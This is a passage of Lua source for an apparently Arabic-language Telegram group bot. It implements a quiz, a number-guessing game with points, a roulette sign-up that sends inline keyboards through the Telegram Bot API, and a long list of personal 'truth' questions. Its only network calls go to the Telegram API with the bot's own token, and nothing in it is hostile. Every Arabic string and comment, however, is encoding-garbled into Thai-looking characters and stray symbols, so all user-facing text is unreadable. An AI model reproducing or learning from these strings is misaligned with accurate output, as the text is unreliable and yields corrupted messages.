name = string.gsub(name,'ุงูุฏููููู','โ๏ธฐูุง ุงูุญููุงู ุงูุฐู ููุงู ูุงุญุฏู ุนููู ููุชูุญู ุ\n1- ุงููุฑุด\n2- ุงูุฏููููู\n3- ุงูุซุนูุจ\n')
name = string.gsub(name,'ุงูุฑูุจุง','โ๏ธฐูุงูู ุงููุงุฑู ุงูุชู ุชููุจ ุจุงููุงุฑู ุงูุนุฌูุฒ ุ\n1- ุงูุฑูุจุง\n2- ุงูุฑููุง ุงูุดูุงููู\n3- ุงูุฑูููุง')
name = string.gsub(name,'ุงูุฒุฆุจู','โ๏ธฐูุง ุงุณู ุงููุนุฏู ุงูููุฌูุฏ ููู ุงูุญุงูู ุงูุณุงุฆูู ุ\n1- ุงููุญุงุณ\n2- ุงูุญุฏูุฏ\n3- ุงูุฒุฆุจู')
name = string.gsub(name,'ููุฏู','โ๏ธฐูุงูู ุนุงุตูู ุงูุฌูุชุฑุง ุ\n1- ููุฏู\n2- ููุฑุณูู\n3- ุชุฑููุง')
name = string.gsub(name,'ุงูุงูุณุงู','โ๏ธฐูุงูู ุงูุดุฆ ุงูุฐู ุจุฑุฃุณู ุณุจุน ูุชุญุงุช ุ\n1- ุงููุงุชู\n2- ุงูุชููุงุฒ\n3- ุงูุงูุณุงู')
name = string.gsub(name,'ุทูููู','โ๏ธฐูุงูู ุนุงุตูู ุงููุงุจุงู ุ\n1- ุจุงูููู\n2- ููู ุฏููู\n3- ุทูููู')
name = string.gsub(name,'ุฎุฏูุฌู','โ๏ธฐูู ูู ุฒูุฌู ุงูุฑุณูู ุงูุงูุจุฑ ููู ุณูุข ุ\n1- ุญูุถู\n2- ุฒููุจ\n3- ุฎุฏูุฌู')
RindaTeam = name..'\nโ๏ธฐุงุฑุณู ุงูุฌูุงุจ ุงูุตุญูุญ ููุท'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum8'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Rinda..'Rio:GameNum8'..msg.chat_id_)
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุงูุงุณุฆูู ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end  
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"โ๏ธฐุนุฐุฑุง ูุง ููููู ุชุฎููู ุนุฏุฏ ุงูุจุฑ ูู ุงูู20 ุฎูู ุฑูู ูุง ุจูู ุงูู1 ูุงูู20", 1, 'md')
return false  end 
local GETNUM = DevRio:get(Rinda.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Rinda..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Rinda.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐ*ุงูุชุฎููู ุงูุตุญูุญ ูู* โข '..NUM..'\nโ๏ธฐ*ูุจุฑูู ููุฏ ุฑุจุญุช ูุญุตูุช ุนูู 5 ููุงุท ููููู ุงุณุชุจุฏุงููุง ุจุงูุฑุณุงุฆู*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:incrby(Rinda..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevRio:get(Rinda..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevRio:del(Rinda..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Rinda.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐ*ุงูุชุฎููู ุงูุตุญูุญ ูู* โข '..GETNUM..'\nโ๏ธฐ*ููุงุณู ููุฏ ุฎุณุฑุช ุญุงูู ุบูเขชูู ูุชุฎููู ุงูุฑูู ุงูุตุญูุญ*', 1, 'md')
else
if tonumber(DevRio:get(Rinda..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'ูุญุงููุชุงู ููุท'
elseif tonumber(DevRio:get(Rinda..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'ูุญุงููู ูุงุญุฏู ููุท'
end
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐููุฏ ุฎููุช ุงูุฑูู ุงูุฎุทุง ูุชุจูู ูุฏูู '..SetNum..' ุงุฑุณู ุฑูู ุชุฎููู ุบูเขชูู ููููุฒ', 1, 'md')
end
end
end
end
if text == 'ุฎูู' and ChCheck(msg) or text == 'ุชุฎููู' and ChCheck(msg) or text == 'โข ุชุฎููู โ' and ChCheck(msg) then   
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevRio:set(Rinda.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงููุง ุจู ุนุฒูุฒู ูู ูุนุจุฉ ุงูุชุฎููู โข โค\n -----------------------------------------\nโ๏ธฐุณูุชู ุชุฎููู ุนุฏุฏ ูุง ุจูู ุงูู1 ูุงูู20 ุงุฐุง ุชุนุชูุฏ ุงูู ุชุณุชุทูุน ุงูููุฒ ุฌุฑุจ ูุงููุนุจ ุงูุงู .\nโ๏ธฐููุงุญุธู ูุฏูู ุซูุงุซ ูุญุงููุงุช ููุท ููุฑ ูุจู ุงุฑุณุงู ุชุฎูููู !', 1, 'md')
DevRio:setex(Rinda.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุฑูููุช' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio:del(Rinda.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:del(Rinda..'Rio:ListRolet'..msg.chat_id_)  
DevRio:setex(Rinda.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุญุณูุง ูููุนุจ , ุงุฑุณู ุนุฏุฏ ุงููุงุนุจูู ููุฑูููุช .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevRio:get(Rinda.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "โ๏ธฐูุง ุงุณุชุทูุน ุจุฏุก ุงููุนุจู ุจูุงุนุจ ูุงุญุฏ ููุท"
else
DevRio:set(Rinda.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = 'โ๏ธฐุชู ุจุฏุก ุชุณุฌูู ุงููุณุชู ูุฑุฌู ุงุฑุณุงู ุงููุนุฑูุงุช \nโ๏ธฐุงููุงุฆุฒ ูุญุตู ุนูู 5 ููุงุท ุนุฏุฏ ุงููุทููุจูู โข '..text..' ูุงุนุจ'
end
DevRio:del(Rinda.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevRio:get(Rinda.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevRio:sismember(Rinda..'Rio:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'โ๏ธฐุงููุนุฑู โข ['..text..'] ููุฌูุฏ ุงุณุงุณุง')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงููุนุฑู ุบูุฑ ุตุญูุญ ูุฑุฌู ุงุฑุณุงู ูุนุฑู ุตุญูุญ', 1, 'md')
return false 
end
DevRio:sadd(Rinda..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevRio:get(Rinda.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevRio:scard(Rinda..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevRio:del(Rinda.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:setex(Rinda.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "โ๏ธฐุชู ุงุฏุฎุงู ุงููุนุฑู โข ["..text.."]\nโ๏ธฐูุชู ุงูุชูุงู ุงูุนุฏุฏ ุงูููู ูู ุงูุช ูุณุชุนุฏ ุ"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุนู โข",callback_data="/YesRolet"},{text="โข ูุง โข",callback_data="/NoRolet"}},{{text="โข ุงููุงุนุจูู โข",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "โ๏ธฐุชู ุงุฏุฎุงู ุงููุนุฑู โข ["..text.."] ูุชุจูู โข "..CountUser.." ูุงุนุจูู ูููุชูู ุงูุนุฏุฏ ุงุฑุณู ุงููุนุฑู ุงูุงุฎุฑ"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก โข",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ูุช' and ChCheck(msg) or text == 'ุชููุช' and ChCheck(msg) or text == 'โข ูุช โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
local RindaTeam = {
'ุขุฎุฑ ูุฑุฉ ุฒุฑุช ูุฏููุฉ ุงูููุงููุ','ุขุฎุฑ ูุฑุฉ ุฃููุช ุฃููุชู ุงูููุถููุฉุ','ุงููุถุน ุงูุญุงููุ\nโ1. ุณูุฑุงู\nโ2. ุถุงูุฌ\nโ3. ุฃุชุฃูู','ุขุฎุฑ ุดูุก ุถุงุน ูููุ','ูููุฉ ุฃุฎูุฑุฉ ูุดุงุบู ุงูุจุงูุ','ุทุฑููุชู ุงููุนุชุงุฏุฉ ูู ุงูุชุฎููุต ูู ุงูุทุงูุฉ ุงูุณูุจูุฉุ','ุดูุฑ ูู ุฃุดูุฑ ุงูุนุงู ูู ุฐูุฑู ุฌูููุฉ ูุนูุ','ูููุฉ ุบุฑูุจุฉ ูู ููุฌุชู ููุนูุงูุงุ๐ค','โ- ุดูุก ุณูุนุชู ุนุงูู ูู ุฐููู ูุงููููููุ','ูุชู ุชูุฑู ุงูุดุฎุต ุงูุฐู ุฃูุงูู ุญุชู ูู ููุช ููู ุฃุดุฏ ูุนุฌุจูููุ','โ- ุฃุจุฑุฒ ุตูุฉ ุญุณูุฉ ูู ุตุฏููู ุงูููุฑุจุ','ูู ุชุดุนุฑ ุฃู ููุงูู ููู ููุญุจูุ','ุงุฐุง ุงูุชุดูุช ุฃู ุฃุนุฒ ุฃุตุฏูุงุฆู ูุถูุฑ ูู ุงูุณูุกุ ููููู ุงูุตุฑูุญุ','ุฃุฌูู ุดูุก ุญุตู ูุนู ุฎูุงู ูุงููููุ','ุตูู ุดุนูุฑู ูุฃูุช ุชูุญุจ ุดุฎุต ููุญุจ ุบูุฑูุ๐๐','ูููุฉ ูุดุฎุต ุบุงูู ุงุดุชูุช ุฅูููุ๐','ุขุฎุฑ ุฎุจุฑ ุณุนูุฏุ ูุชู ูุตููุ','ุฃูุง ุขุณู ุนูู ....ุ','ุฃูุตู ููุณู ุจูููุฉุ','ุตุฑูุญุ ูุดุชุงูุ','โ- ุตุฑูุญุ ูู ุณุจู ูุฎุฐูุช ุฃุญุฏูู ููู ุนู ุบูุฑ ูุตุฏุ','โ- ูุงุฐุง ุณุชุฎุชุงุฑ ูู ุงููููุงุช ูุชุนุจุฑ ููุง ุนู ุญูุงุชู ุงูุชู ุนุดุชูุง ุงูู ุงูุขูุ๐ญ','โ- ููุงู/ุฉ ุชูุฏ ูู ูุฏุนููู ุนูู ูุงุฆุฏุฉ ุนุดุงุกุ๐โค','โ- ุชุฎููู ุดูุก ูุฏ ูุญุฏุซ ูู ุงููุณุชูุจูุ','โ- ููุดุจุงุจ | ุขุฎุฑ ูุฑุฉ ูุตูู ุบุฒู ูู ูุชุงุฉุ๐','ุดุฎุต ุฃู ุตุงุญุจ ุนูุถู ููุณุงู ููุฑ ุงูุญูุงุฉ ูุง ุงุณูู ุ','| ุงุฐุง ุดูุช ุญุฏ ูุงุนุฌุจู ูุนูุฏู ุงูุฌุฑุฃู ุงูู ุชุฑูุญ ูุชุชุนุฑู ุนููู ุ ููุฏูุฉ ุงูุญุฏูุซ ุดู ุฑุงุญ ุชููู ุ.','ูู ูุฑู ุชุณุจุญ ุจุงูููู','ูุณุจุฉ ุงููุนุงุณ ุนูุฏู ุญุงูููุงุ','ูู ููุท ูุณููุญ ุดุฎุต ูุงุญุฏ ุชุชุงุจุนู ูุงูุณูุงุจ ููู ุจูููู ุ','ูููู ููุงุจุณู ุชููู ูุงุฑูุฉ ุ','ูุด ุงูุดูุก ุงูู ุชุทูุน ุญุฑุชู ููู ู ุฒุนูุช ุ','ุนูุฏู ุฃุฎูุงู ุงู ุฎูุงุช ูู ุงูุฑุถุงุนุฉุ','ุนูุฏู ูุนุฌุจูู ููุง ูุญุฏ ุฏุฑุง ุนููุ','ุฃุตุนุจ ุตูุฉ ูุฏ ุชุชูุงุฌุฏ ูู ุงูุฑุฌู .ุ','ูู ุงููุฏู ุงูู ุชุฎููู ุชููุน ุจุญุจ ุงูุดุฎุตุ.','ุชุญุณ ุงูู ูุณุชุนุฏ ูููุงุก ุงููู ููุง ุจุงูู.ุ','ูุชุตุงูุญ ูุน ููุณูุ.','ูุณูุฑ ุนูู ุฃุตุจุนู ุงูุจุงุจ ููุง ุชุนุถ ูุณุงูู  ุจุงูุบูุทุ!','ุนูุฏู ุบูุงุฒุงุชุ.','โุฃููุงูู ุงูููุถููุฉุ','ุฑุฏุฉ ูุนูู ููุง ุชูุธูู ูู ุดุฎุต ุ','ูุด ุงูุญุจ ุจูุธุฑูุ','ุฃูุซุฑ ุดูุก ุชูุฏุฑู ูู ุงูุตุฏุงูุงุชุ','โููุฎูุฑูู โ ุงูุงูู ูู ุงููุช ุ!','ุนุงุฌุจู ูุฌูุฏู ูู ุงูุชูู ููุง ุชุชููู ุชุญุฐูุฉ.ุ','ุงูุถู ูุฏูู ูููู ุชูุงุณุจูุ','ุดุนูุฑู ุงูุญุงูู ูู ุฌููุฉุ','ุฃูุง ุญุฒูู ุฌุฏุงู ุฃุฌุนููู ุฃุจุชุณู.ุ','ุจูุงุฐุง ูุชุนุงูู ุงููุฑุกุ','ุชุงู ูุดุฎุต ููุณููุ','ุดุงุฑููุง ุจูุช ุดุนุฑู ุญุฒูู ุนูู ุฐููู.ุ','ุงุบููุฉ ุนูุฏู ุจููุง ุฐูุฑูุงุชุ','ุงุดูุงุก ุชูุชุฎุฑ ุงูู ู ุณููุชูุง ุ','ุงูุตุฑุงุญุฉ ููุงุญุฉ ููุง ุตุฏู ุชุนุงูู.ุ','ุงููู ุงุตุฏู ูุธุฑุฉ ุงูุนูู ุงู ูุจุฑุฉ ุงูุตูุช ุ','โูููุฉ ุงููุงู ูุฏู ุงูุฑุฌู ูู ูุฐุง ุงูุฒูู ูุนุชุจุฑูุง ุงูุนุฏูุฏ ูุงููุง ุนูุจุ ูุน ุฃู ุถุฏุ','ุฅูููุง ุชููุถู ุญูุจ ูุงุฌุญ ุฃู ุตุฏุงูุฉ ุฏุงุฆูุฉ.ุ','ุนูู ููุงุชููู ุชูุฑุฒููู ุชุงู ูุดุฎุต ููุทุจู ุนููุฉ ูุฐุง ุงูุดูุก.ุ','ุงูุซุฑ ูููุฉ ุชุฑูุน ุถุบุทู ุ','ูู ุฃุตุญุงุจ ุงููุงุถู ูุงูุญููู ููุง ุงูุตูุญุงุช ุงููุทููุฉ.ุ','ูู ุฃุตุญุงุจ ุงููุณูุงู ุงู ุงูุชุฌุงูุฒ ุฑุบู ุงูุฐูุฑู.ุ','ุบุฒู ุจููุฌุชู ุ','ูุตุฑููู ููุ.','ููุญุชูุช โ ูุงุฐุง ุชูุถูููู ุฃู ุชููู ูููุฉ ุดุฑูู ุญูุงุชู ุงููุณุชูุจูู.ุ','ูููู ุถุงุน ุนููุ','ูุง ุงูุฐู ุงุณุนุฏู ุงูููู .ุ','ููู ุชุชุนุงูู ูุน ุงูุดุฎุต ุงูููุชุทูู ( ุงููุถููู ) ุ','ุฃุตุนุจ ุตูุฉ ูุฏ ุชุชูุงุฌุฏ ูู ุงููุฑุฃุฉ.ุ','ูุน ุฃู ุถุฏ ูู ูุงู ุฎูุฑุงู ูุจูุฆ.ุ','ูุตูุญุฉ ููู ุดุฎุต ูุฐูุฑ ุฃุญุฏ ุจุบูุงุจุฉ ุจุงูุณูุก.ุ','ูู ุดูุก ูููู ุงูุง ุ','ูู ุฃูุช ูู ุงูููุน ุงูุฐู ููุงุฌู ุงููุดุงูู ุฃู ูู ุงูููุน ุงูุฐู ููุฑุจ ุ','ูููู ูุดุฎุต ุฎุงูู!ุ.','ุชุญุจ ุชุญุชูุธ ุจุงูุฐูุฑูุงุช ุ','ุดุงุฑููุง ุฃููู ุจูุช ุดูุนุฑ ูู ุชุฃููููุ','โุงุณุฑุน ุดูุก ูุญุณูู ูู ูุฒุงุฌูุ','ูููุชู ุงูุชุณููููู ุ','ูู ุณุงุนุงุช ููููุ.','ุนูุฏู ููุจูุง ุงู ุฎูู ุดุฏูุฏ ูู ุดูุก ูุนูู ุ','ูููุจุฉ ุชููุฒ ุจูุฏุญ ุงููุงุณ ูู.ุ','ูุฏูุชู ูู ุงูุฃุฌูุงู ุงูุณุงุจูุฉุ','ุดุฎุต ุชุชููุฆ ูู ุงูููุชุ.','ุนุงุฏุฉู ุชูุญุจ ุงูููุงุด ุงูุทููู ุฃู ุชุญุจ ุงูุงุฎุชุตุงุฑุ','ุชุงู ูุดุฎุต ููุชู ุฒุจุงูู๐ุ','ุตูุชู ุญูู ุ .','ูููุชูู ุชูุฑุฑูุง ุฏุงููุ!','ุงูุถู ุฑูุงูู ูุฑูุชููุงุ.','ูุชู ุญุฏุซ ุงูุชุบููุฑ ุงููุจูุฑ ูุงูููุญูุธ ูู ุดุฎุตูุชูุ','ุฃูุซุฑ ุงูููู ุชุญุจูุงุ.','โูููุง ุงุฒุฏุงุฏุช ุซูุงูุฉ ุงููุฑุก ุงุฒุฏุงุฏ ุจุคุณู','ุชุชูู.ุ','ุงุบุจู ูุฐุจู ุตุฏูุชูุง ุจุทูููุชูุ.','ูู ุงููุฏู ุงูู ุชุฎููู ุชููุน ุจุญุจ ุงูุดุฎุตุ.','ุชุณุงูุญ ุดุฎุต ูุฌุน ููุจู ุ.','ุฑุฏุฉ ูุนูู ููุง ุชูุธูู ูู ุดุฎุต ุ','ุดูุก ูุนุฏู ููุณูุชู ุจุซูุงูู.ุ','โุชุชููุน ุงูุฅูุณุงู ูุญุณ ุจูุฑุจ ููุชูุ','ููุช ุญุฒูู ุชูุฌุฃ ููู ูุฎูู ุนูู.ุ','โุฃูุซุฑ ุดูุก ุดุฎุตู ุถุงุน ูููุ','ุชุฒุนูู ุงูุฏููุง ููุฑุถูู ุ','ูุง ุงูุฐู ูุดุบู ุจุงูู ูู ุงููุชุฑุฉ ุงูุญุงููุฉุ','ููุงุฑู ูุตูุฑ ุฃุฌูู ุจูุฌูุฏ ..ุ','ุญุณูุช ุงูู ุธููุช ุดุฎุต.ุ','ุตูุฉ ูุทูููุง ุนููู ูู ุญููู ุจูุซุฑุฉุ','โููู ูุง ููููู ูุณูุงููุ','ุฃูุซุฑ ุงูููู ุชุญุจูุงุ.','ุงุฎุฑ ูููุฉ ูุงููุง ูู ุญุจูุจูุ.','ูู ุงูุดุฎุต ุงูุงูุฑุจ ูููุจูุ.','ูู ุงููุฏู ุงูู ุชุฎููู ุชููุน ุจุญุจ ุงูุดุฎุตุ.','ูุงูู ุงููุฏูุฉ ุงูุชู ุชุชููู ุฃู ุชูุชุธุฑู ููููุง ุฃูุงู ุจุงุจ ููุฒููุ','โุงุณู ุงู ุชุงู ูุดุฎุต ูุง ุชุฑุชุงุญ ูู ูููู ุฅูุง ุฅุฐุง ุญุงุฌูุชูุ','ุตุฏูู ุฃูู ููุง ุฃุจูู. ุ','ููุงุฐุง ุงูุฃุดูุงุก ุงูุชู ูุฑูุฏูุง ุจุดุบู ุชุฃุชู ูุชุฃุฎุฑุฉุ','โุชูุจู ุจุงูุนูุฏุฉ ูุดุฎุต ูุณุฑ ููุจู ูุฑุชููุ','ุงูุถู ูุฏูู ูููู ุชูุงุณุจูุ','ูููุฉ ุบุฑูุจุฉ ููุนูุงูุงุ','ุงุฐุง ุงุดุชูุช ุชูุงุจุฑ ููุง ุชุจุงุฏุฑ ุ.','ุจุงููุงูู ุชูุฒุน ุดุนูุฑ ูู ููุจู ููุงุจุฏ ุ ุงูุด ููุ.','ูู ุจุชุบูุฑ ุงุณูู ุงูุด ุจูููู ุงูุฌุฏูุฏ ุ','โุดุฎุตูุฉ ูุง ุชุณุชุทูุน ุชูุจููุงุ','ูุง ูู ุทุฑููุชู ูู ุงูุญุตูู ุนูู ุงูุฑุงุญุฉ ุงูููุณูุฉุ','โุงูููุฌู ููุตู ูุฒุงุฌู ุญุงูููุง ุจุฏูุฉุ','ุชุงุฑูุฎ ูููุงุฏูุ','ููู ุชุญุฏ ุงูุฏููุฉ ูู ุงูููุฑ ุงูููุชุฒุงูุฏ.ุ','โุดู ูุณุชุญูู ูุชุบูุฑ ูููุ','ูู ุงุฎุฐูู ููุณุชุดูู ุงููุฎุงุจูู ููู ุชุซุจุช ุงูุช ุตุงุญูุ','ุฅูููุฌู ูุนุจูุฑ ุนู ูุฒุงุฌู ุงูุญุงููุ','ููุช ุญุฒูู ุชูุฌุฃ ููู ูุฎูู ุนูู.ุ','ุงุนุชุฑู ุจุงู ุญุงุฌู ุ','ุดุงุฑููู ุขุฎุฑ ุตูุฑุฉ ุฌูููุฉ ูู ูุงููุฑุง ูุงุชูู.ุ','ูุชุตุงูุญ ูุน ููุณูุ.','ูู ุนูุฏู ุงูููู ูุจุชุญูู ูุด ููุ.','ูู ุงูุช ุดุฎุต ูุงุฏู.ุ','ุฃุฎุฑ ุงุชุตุงู ุฌุงู ูู ููู ุ','ุชุงู ูุตุฏููู ุงููููุฑุจุ.','ุชุญุจ ุงูุนูุงูุงุช ุงูุนุงุทููู ููุง ุงูุตุฏุงููุ.','ุงูุนูู ุงูู ุชุณุชุตุบุฑู........ุ','ุชุฌุงูู ุงููุงุณ ููุง ุงููู ุจููุจู ุนูู ูุณุงููุ','ููุช ุญุฒูู ุชูุฌุฃ ููู ูุฎูู ุนูู.ุ','ุงูุซุฑ ุงููุชุงุจุนูู ุนูุฏู ุจุงู ุจุฑูุงูุฌุ','ุตูู ุชุชููุงูุง ุจุดุฑูู ุญูุงุชูุ.','ูู ุงุตุฏู ูู ุงูุญุจ ุงูููุฏ ููุง ุงูุจูุชุ.','ูุฑุฏ ุนููู ูุชุฃุฎุฑ ุนูู ุฑุณุงูุฉ ูููุฉ ูุจูู ุจุฑูุฏุ ูููููุ','ูููุฉ ูุดุฎุต ุจุนูุฏุ','ุฑุญุชู ูุนุฑุณ ูุฃูุชุดูุชู ุงูุนุฑูุณ ุญุจูุจู ุดูู ุฑุฏุฉ ูุนูู.ุ','ุชุณุงูุญ ุดุฎุต ูุฌุน ููุจู ุ.','ุงุญูุฑ ูููู ุตุงุฑ ููุ.','ูุงุฐุง ูู ูุงูุช ูุดุงุนุฑ ุงูุจุดุฑ ูุฑุฆูุฉ ุ','ููู ูููู ุงูุณุนุงุฏู ุจุฑุงููุ','ูุฏ ุชุฎููุช ุดู ูู ุจุงูู ูุตุงุฑ ุ','ุตูุฉ ูุทูููุง ุนููู ุงูุดุฎุต ุงูููุถููุ','ุงุฎุฑ ุฎูุงููุ.','ุชุญุจ ุชุญุชูุธ ุจุงูุฐูุฑูุงุช ุ','ูู ุจุชุบูุฑ ุงุณูู ุงูุด ุจูููู ุงูุฌุฏูุฏ ุ','ุงูุงุนุชุฐุงุฑ ุฃุฎูุงู ููุง ุถุนู.ุ','ูู ุฃูุช ูู ุงูููุน ุงูุฐู ููุงุฌู ุงููุดุงูู ุฃู ูู ุงูููุน ุงูุฐู ููุฑุจ ุ','โ ุชูุฑู ุฃุญุฏ ูู ููุจู ุ','ุชุงู ูุดุฎุต ููููู ุงุนุชุฑู ููุ','ูุน ุฃู ุถุฏ ูู ูุงู ุฎูุฑุงู ูุจูุฆ.ุ','โูู ูุฏูู ุดุฎุต ูุง ุชุฎูู ุนูู ุดูุฆูุงุ','ุงุบููู ุชุฃุซุฑ ุจููุ','ุงููุทูุนุฉ ูุงูุนุงููุฉ ูู ุดูุชู.ุ','ููุงุตูุงุช ุงููุฑ/ุฉ ุงุญูุงููุ.','โูููุฉ ูุตุฏููู ุงูุจุนูุฏุ','ุชุชุงุจุน ุงูููุ ุฅุฐุง ูุนู ูุง ุฃูุถู ุงููู ุดุงูุฏุชูุ','ูุฑุงุฑุชู ุฑุงุถู ุนููุง ุงู ูุง ุ','ุชุณุงูุญ ุดุฎุต ุณุจุจ ูู ุจูุงุฆู.ุ','ูู ุญุตู ูุงุดุชุฑูุช ุฌุฒูุฑุฉุ ูุงุฐุง ุณุชุฎุชุงุฑ ุงุณููุง ููุง.ุ','ุงุบููุชู ุงูููุถูุฉุ.','ุดุงุฑููุง ุงููุฆ ููุชุฉ ุนูุฏู.ุ','ูุงุฐุง ูู ุนุงุฏ ููุดุชุงูุงู.ุ','ูุณูุณู ูุฑุชููู ูู ุฐูุฑูุงุช ุฌูููุฉ ุนูุฏูุ','ุฃุฎุฑ ุงุชุตุงู ุฌุงู ูู ููู ุ','ุญููุงูู ุงูููุถูุ','ุงูู ููุฏ ูู ุดูู ุฑุญ ุชุณููู ุ','ุณุจุจ ุงูุฑุญูู.ุ','ููููุง ุจููุฌุชู ยซ ูุง ุฃููู ุงููุงู ยป.ุ','ููุงุฑู ูุตูุฑ ุฃุฌูู ุจูุฌูุฏ ..ุ','โูู ุฎูุฑููุ ุงูุฒูุงุฌ ุจูู ุชูุญุจ ุงู ุชุงุฎุฐ ููููู ุฏููุงุฑุ','ุชุงู ูุดุฎุต ุณูุงููู ุญููู ุ','ุชุตุฑู ูุง ููููู ุฃู ุชุชุญููู.ุ','ูุงูู ุงูุงุทุจุงุน ููู ุงูุชู ุชุญุงูู ุงุฎูุงุฆูุง ุนู ุงููุงุณุ.','ุดูุก ุนูุฏู ุงูู ูู ุงููุงุณุ','ูุฏ ุชุฎููุช ุดู ูู ุจุงูู ูุตุงุฑ ุ','ุชูุญู ุงูุนุดุฑุฉ ุงูุทูุจุฉ ุนุดุงู ูููู ูุงุนุฌุจู ุฃู ุณูุก ููู.ุ','ุฌุฑุจุช ุดุนูุฑ ุงุญุฏ ูุญุจู ุจุณ ุงูุช ูุชูุฏุฑ ุชุญุจูุ','ุจููุณู ุชุจูุณ ุดุฎุต ุจูุงู ุงูุญุธูุ','ุฅุฐุง ูุงูุช ุงูุตุฑุงุญุฉ ุณุชุจุนุฏ ุนูู ูู ุชุญุจ ูู ุชูุชูู ุงูุดุฌุงุนุฉ ูููุตุงุฑุญุฉ ุงู ูุง .ุ','ุฃููู ุงูุฏุนุงุก ุจูุง ุดุฆุช โุงูููู ุฃุฑุฒููู ..ุ','ุงูุตู ุงุฎุฑ ุดูุก ูุณุฎุชู .ุ','โุชูุถู ุฌููุฉ ูู ุงูุบุงุจุฉ ุฃู ุฌููุฉ ุจุญุฑูุฉุ','โุชุงู ูุดุฎุต ูุฏูู ูุง ุชุฎูู ุนูู ุดูุ','ูููุฉ ุบุฑูุจุฉ ููุนูุงูุงุ','โุงููุงุช ูุง ุชุญุจ ุงู ููููู ูููุง ุงุญุฏุ','ุชููู ูุณูุงุณ ูู ุดูุก ูุนูู ุ','ุงุดูุฑ ููุทุน ูู ุงุบููู ูุชุทูุน ููุฑุงุณูุ','ูู ุชุชุฃุซุฑูู ุจุงูููุงู ุงูุฑููุงูุณู ูู ุงูุดุจุงุจุ','ูุง ุงูู ุดูุก ูููุช ุงูุชุจุงูู ูู 